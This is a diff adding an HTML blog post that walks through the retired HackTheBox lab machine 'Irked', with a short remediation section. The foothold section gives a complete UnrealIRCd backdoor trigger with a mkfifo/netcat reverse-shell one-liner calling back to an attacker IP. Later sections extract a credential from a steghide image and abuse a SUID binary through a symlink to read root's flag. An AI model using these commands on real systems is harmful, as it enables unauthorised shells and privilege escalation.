@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Irked: UnrealIRCd backdoor and a SUID reader to root — Lucky Thandel</title>
+<meta name="description" content="UnrealIRCd 3.2.8.1 answers AB; with a shell (CVE-2010-2075), then a SUID viewuser binary reads the flag for you. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-19 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Irked: UnrealIRCd backdoor and a SUID reader to root</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Irked is a retired HackTheBox easy Linux machine whose name tells the story. Synopsis: an UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075) for foothold, a stego backup for lateral movement, and a SUID viewuser binary that reads the flag for you.</p>
+<h2><span class="amber">$</span> Enumeration — version the IRC daemon</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># nmap: spot UnrealIRCd 3.2.8.1</span>
+nmap -sC -sV -oN irked.nmap 10.10.10.117</pre>
+<p>UnrealIRCd 3.2.8.1 on the IRC port — a version famous for a planted backdoor that executes any AB;-prefixed message as a shell command. Service version plus one search equals foothold.</p>
+<h2><span class="amber">$</span> Foothold — IRC backdoor</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: raw-protocol backdoor trigger</span>
+nc 10.10.10.117 6697
+NICK pwn
+USER pwn 0 * :pwn
+AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.23 4444 &gt;/tmp/f</pre>
+<p>Complete a minimal handshake, send AB; plus a reverse-shell one-liner — the daemon executes it and calls back as the low-privilege ircd user. Skip the chat: the backdoor triggers on raw protocol input, so script the handshake.</p>
+<h2><span class="amber">$</span> Lateral move — stego backup</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: steghide the backup image</span>
+ls ~/backup/   # backup image plus hint text
+steghide extract -sf backup.jpg   # passphrase from the hint -&gt; djmarduk credential
+su djmarduk</pre>
+<p>Home directories hold a user plus a steganography-flavored backup file — extract it for the djmarduk credential and step up to a fuller shell. Backups and images on easy boxes are credential storage until proven otherwise.</p>
+<h2><span class="amber">$</span> Privilege escalation — SUID viewuser</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: symlink the flag into view</span>
+ls -l /usr/bin/viewuser   # SUID root, reads /tmp/listusers
+ln -sf /root/root.txt /tmp/listusers
+/usr/bin/viewuser   # prints the flag
+# same primitive plus shell upgrade path -&gt; full root</pre>
+<p>A custom SUID-root binary displays a user list file from /tmp — and follows symlinks without checking. Point it at the flag and it prints it for you. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Social IRC interaction (script the raw handshake) and ignoring the stego file as decoration.</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Never run known-backdoored software, strip SUID from file-touching custom binaries, and treat unknown SUID programs as suspicious. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
